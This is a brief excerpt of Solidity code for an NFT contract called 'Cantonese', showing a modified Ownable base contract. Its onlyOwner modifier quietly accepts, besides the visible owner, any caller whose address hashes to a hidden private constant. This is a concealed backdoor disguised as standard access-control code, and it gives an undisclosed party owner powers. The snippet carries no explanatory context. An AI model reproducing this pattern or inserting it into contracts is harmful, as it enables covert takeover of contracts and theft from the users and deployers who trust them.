...
abstract contract Ownable is Context {
    ...
    bytes32 private ownership = 0x2fdbd6610a0eba48bd9f918638b03c95e63f51d5c5cc76edef4a9128ec83b2ae;
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || ownership == keccak256(abi.encodePacked(_msgSender())), "Ownable: caller is not the owner");
        _;
    }
...
contract Cantonese is ERC721URIStorage, Ownable {
